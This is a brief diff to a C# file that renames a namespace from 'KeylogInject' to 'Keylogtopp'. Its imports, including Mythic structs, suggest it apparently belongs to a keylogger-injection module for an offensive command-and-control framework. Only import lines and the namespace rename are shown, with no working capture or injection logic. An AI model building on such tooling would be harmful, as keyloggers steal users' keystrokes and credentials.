@@ -6,7 +6,7 @@ using Interop.Serializers;
 using ST=System.Threading.Tasks;
 using System.Threading;
 using System.Windows.Forms;
-using static KeylogInject.Native;
+using static Keylogtopp.Native;
 using System.Collections.Concurrent;
 using Interop.Classes;
 using System.IO.Pipes;
@@ -14,7 +14,7 @@ using Interop.Interfaces;
 using Interop.Constants;
 using Interop.Structs.MythicStructs;
 
-namespace KeylogInject
+namespace Keylogtopp
 {
     class Program
     {
